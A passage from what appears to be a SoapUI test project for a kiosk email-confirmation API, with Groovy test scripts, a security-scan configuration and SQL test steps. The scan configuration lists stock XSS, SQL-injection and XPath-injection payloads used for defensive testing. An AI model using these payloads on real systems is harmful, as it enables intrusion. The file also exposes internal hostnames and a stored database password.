transferChildNodes="false"><con:name>LoginEmailAddress</con:name><con:sourceType>ResponseAsXml</con:sourceType><con:sourceStep>GetCustomerInfo</con:sourceStep><con:sourcePath>//Results[1]/ResultSet[1]/Row[1]/LOGINEMAILADDRESS[1]</con:sourcePath><con:targetType>Email</con:targetType><con:targetStep>#TestCase#</con:targetStep><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (EmailConfirm)" id="a827a7fc-d01e-4c72-938a-4008f4209759"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

requestPayload = "";
def KioskID = context.expand( '${#TestCase#KioskID}' );
def Email = context.expand( '${#TestCase#Email}' );
def MessageId = UUID.randomUUID().toString();


//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"Email\": \"$Email\",";
requestPayload += "\"UseMessageControl\": false,";
requestPayload += "\"MessageType\": \"EmailConfirm\"";
requestPayload += "}";

// log to soapui log
log.info("EmailConfirmRequest: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("EmailConfirmGUID",MessageId.toString()); //For MessageControl Validations</script></con:config></con:testStep><con:testStep type="httprequest" name="EmailConfirm (Request)" id="f6e6c96f-dd15-4025-b208-a5f640455ed1"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="EmailConfirm (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("EmailConfirmResponse: $response")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="EmailConfirm (Assertions)" id="dd1fe812-2826-4ec1-b218-fb1df2df7257"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('EmailConfirm (Request)').getPropertyValue('Response');
def decodedBody = URLDecoder.decode(encodedBody);
def list = new JsonSlurper().parseText( decodedBody );
def actualPromptForPerks = list.get('PromptForPerks');
def actualPromptForEarlyId = list.get('PromptForEarlyId');
def actualTextClubEnabled = list.get('TextClubEnabled');
def actualSuccess = list.get('Success');

//Expected
def earlyIdOptInStatus = context.expand( '${DataSource#EarlyIdOptInStatus}' )
def textClubOptInStatus = context.expand( '${DataSource#TextClubOptInStatus}' )
def punchcardOptIN = context.expand( '${DataSource#PunchcardOptIN}' )

if (earlyIdOptInStatus == 'NotEnrolled')
{
	assert (actualPromptForEarlyId == true);
}
else
{
	assert (actualPromptForEarlyId == false);
}

if (punchcardOptIN == 'true')
{
	assert (actualPromptForPerks == false);
}
else
{
	assert (actualPromptForPerks == true);
}

if (textClubOptInStatus == 'Enrolled')
{
	assert (actualTextClubEnabled == true);
}
else
{
	assert (actualTextClubEnabled == false);
}</script></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="9eebd3bc-2d7f-4641-ab63-c51b6783da8a"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Setup</targetStep></con:config></con:testStep><con:properties><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>Email</con:name><con:value>anusbxu711@redbox.com</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%2213b389dd-d0cf-4a3a-afbe-24f68dc72e0d%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22Email%22%3A+%22anusbxu711%40redbox.com%22%2C%22UseMessageControl%22%3A+false%2C%22MessageType%22%3A+%22EmailConfirm%22%7D</con:value></con:property><con:property><con:name>EmailConfirmGUID</con:name><con:value>13b389dd-d0cf-4a3a-afbe-24f68dc72e0d</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>59446925965076</con:value></con:property><con:property><con:name>CustomerProfileId</con:name><con:value>795843</con:value></con:property></con:properties><con:reportParameters/><con:securityTest id="a868ab41-2682-4f55-9a8b-c3e01488395f" testCaseId="9b87afa5-8c9c-4eac-8bec-06abbb576fc7" name="SecurityTest 4" failSecurityTestOnScanErrors="true"><con:settings/><con:testStepSecurityTest><con:testStepId>f6e6c96f-dd15-4025-b208-a5f640455ed1</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="2e6f9114-18b2-4f0e-a460-25504a2b809b" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="Sensitive Information Exposure" id="a80963ca-b8af-4770-a404-04d0ac04bcf6" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="CrosSiteScript" id="e4e3ac17-13f0-4a5d-a35e-fc10fb91405f" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="07627105-8723-4da3-bb1f-f4e1fb7cb190" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:minimal>5</con:minimal><con:maximal>15</con:maximal><con:numberOfRequest>100</con:numberOfRequest></con:config><con:assertion type="Sensitive Information Exposure" id="b07b3757-8f52-4a14-b3d7-45e6f68f3e60" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ALL_AT_ONCE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="15b61e53-faac-4550-aa06-617aea95ba42" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>'--</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings><con:sqlInjectionStrings>;</con:sqlInjectionStrings><con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings><con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings></con:config><con:assertion type="Sensitive Information Exposure" id="f81dcfb6-9a6c-4da1-8389-4656b1f1f2b1" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="c41a3987-9842-4115-904b-66d1983ba8d3" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:xpathList> or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList><con:xpathList>' or '1'='1</con:xpathList><con:xpathList>1/0</con:xpathList><con:xpathList>'%20o/**/r%201/0%20--</con:xpathList><con:xpathList>' o/**/r 1/0 --</con:xpathList><con:xpathList>;</con:xpathList><con:xpathList>'%20and%201=2%20--</con:xpathList><con:xpathList>' and 1=2 --</con:xpathList><con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList><con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList></con:config><con:assertion type="Sensitive Information Exposure" id="cdfdb7be-dbbc-40c4-98e3-4c2d76ea6a1b" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Request" parameterName="Request" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="5b265b8f-068a-44a1-af4f-2e194725b471" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:deselectedMethods/></con:config><con:assertion type="Sensitive Information Exposure" id="e9b58214-f12d-4640-b7f1-ed2ae28aa296" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="98565dcc-0311-4b57-8443-2ba6843fb366" name="Valid HTTP Status Codes"><con:settings><con:setting id="__LEVEL_">WARNING</con:setting></con:settings><con:configuration><codes>501,405,403</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="4294a1db-a284-4505-8e1e-b0b3d069c3e4" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="WeakPassword" id="cdeb0b8c-11a1-4ea2-a4a9-5ce73353894c" name="Weak Password Detection"><con:configuration/></con:assertion><con:assertion type="BasicAuth" id="52fea3b6-eeb9-42b5-8c0c-7588e37db9a6" name="Basic Authentication Detection"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan></con:testStepSecurityTest><con:properties/><con:reportParameters/></con:securityTest><con:breakPoints><con:testStepId>12c98da2-fbe7-417e-ac6a-1d4e50507450</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>19b336cf-da7d-424e-a7ad-997fd09502b4</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>dd1fe812-2826-4ec1-b218-fb1df2df7257</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c4a6a661-c0a6-4f93-a9ee-3eb085c863fa</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:properties/><con:reportParameters/></con:testSuite><con:testSuite id="78076cad-e8fe-4bda-ab11-06d2a1cef8b1" name="Generic Steps (Others)"><con:description>Contains Generic Steps that are being used from other systems. 
Like: Merchant Service, Corporate Service, CreditSvc methods.</con:description><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="6912ac35-0e2c-446e-9b8b-0f5720b441af" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="Set Up Credits" searchProperties="true" timeout="0" maxResults="0"><con:description>Create Credits.
Credits are created based on transaction/scenario.</con:description><con:settings/><con:testStep type="jdbc" name="Soft Delete ANY Non Final Credits" id="6cf5a15e-e975-4c76-a5c1-32a48b760929"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>CreditSvc</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CreditSvc;integratedSecurity=true;</con:connectionString><con:password>Sec</con:password><con:connectionProperties/><con:query>UPDATE 
	Credit.Credit
SET 
	CreditStateId = 5
WHERE 
	CustomerProfileNumber = :CPNum
AND 
	CreditStateId in (1, 2)
</con:query><con:assertion type="JDBC Status" id="949039f2-35a3-4b88-9d09-03b841d563ef" name="JDBC Status"/><con:properties><con:property><con:name>CPNum</con:name><con:value>${#TestCase#CpCustomerNumber}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="UpdateOpenCart" id="a8c8c756-8049-4b90-a475-87d1b4333f30"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>CreditSvc</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB107.rb.local:1433;databaseName=CreditSvc;integratedSecurity=true;</con:connectionString><con:password>Sec</con:password><con:connectionProperties/><con:query>Update 
	OpenCart.RentedItem
Set 
